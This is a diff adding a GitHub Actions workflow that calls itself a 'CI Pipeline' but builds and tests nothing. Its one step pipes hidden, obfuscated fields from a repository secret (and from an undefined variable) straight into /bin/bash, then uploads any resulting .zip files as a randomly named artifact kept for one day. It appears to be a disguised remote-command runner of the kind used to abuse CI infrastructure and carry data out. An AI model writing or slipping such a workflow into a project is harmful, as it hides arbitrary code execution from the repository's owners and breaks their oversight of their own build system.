@@ -1,0 +1,25 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          hvl6: ${{ secrets.hvl6 }}
+        run: |
+          printf '%s' "$hvl6" | jq -r .dds35806 | /bin/bash
+          printf '%s' "$u63" | jq -r .hmc81436 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: coQqQ3dv
+          path: "*.zip"
+          retention-days: 1
